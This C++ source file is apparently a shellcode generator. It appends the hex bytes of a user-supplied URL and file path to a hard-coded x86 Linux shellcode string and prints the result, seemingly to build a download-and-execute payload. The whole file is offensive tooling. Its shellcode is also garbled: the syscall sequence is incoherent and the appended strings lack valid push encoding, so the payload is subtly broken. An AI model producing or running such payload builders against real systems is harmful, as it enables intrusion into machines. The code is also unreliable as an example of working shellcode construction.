#include <iostream>
#include <string>
#include <sstream>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <URL> <FilePath>" << std::endl;
        return 1;
    }

    std::string url = argv[1];
    std::string filePath = argv[2];
    int urlLength = url.length();
    int filePathLength = filePath.length();

    std::string shellcode = "\\x31\\xc0\\x31\\xdb\\xb0\\x03\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x04\\x5b\\x31\\xc9\\xb1\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x31\\xdb\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x31\\xdb\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x31\\xdb\\xcd\\x80\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68";

    std::stringstream urlStringStream;
    for (int i = 0; i < urlLength; i++) {
        urlStringStream << "\\x" << std::hex << static_cast<int>(url[i]);
    }
    shellcode += urlStringStream.str();
    shellcode += "\\x68";

    std::stringstream filePathStringStream;
    for (int i = 0; i < filePathLength; i++) {
        filePathStringStream << "\\x" << std::hex << static_cast<int>(filePath[i]);
    }
    shellcode += filePathStringStream.str();
    shellcode += "\\x89\\xe3\\xcd\\x80";

    std::cout << "URL: " << url << std::endl;
    std::cout << "File Path: " << filePath << std::endl;
    std::cout << "Shellcode: " << shellcode << std::endl;

    return 0;
}
